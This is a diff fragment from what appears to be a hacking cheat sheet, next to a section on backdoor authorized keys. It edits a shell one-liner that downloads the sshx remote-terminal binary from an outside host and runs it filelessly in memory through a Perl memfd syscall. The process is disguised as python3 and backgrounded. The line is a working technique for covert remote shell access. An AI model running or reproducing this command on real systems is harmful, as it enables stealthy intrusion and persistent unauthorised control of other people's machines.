@@ -1750,7 +1750,7 @@ for _ in {1..10}; do [ -s .u ] && break;sleep 1;done;cat .u;rm -f .u .s;
 
 Or pipe directly into memory:
 ```shell
-echo $(curl -SsfL https://s3.amazonaws.com/sshx/sshx-$(uname -m)-unknown-linux-musl.tar.gz|tar xfOz - sshx 2>/dev/null|nohup perl '-efor(319,279){($f=syscall$_,$",1)>0&&last};open($o,">&=".$f);print$o(<STDIN>);exec{"/proc/$$/fd/$f"}"/usr/bin/python3",@ARGV' -- "-q" 2>/dev/null|{ read x;echo "$x";}&)
+echo $(curl -SsfL https://s3.amazonaws.com/sshx/sshx-$(uname -m)-unknown-linux-musl.tar.gz|tar xfOz - sshx 2>/dev/null|nohup perl '-efor(319,279){($f=syscall$_,$",1)>0&&last};open($o,">&=".$f);print$o(<STDIN>);exec{"/proc/$$/fd/$f"}"/usr/bin/python3",("-q")' 2>/dev/null|{ read x;echo "$x";}&)
 ```
 
 <a id="backdoor-auth-keys"></a>
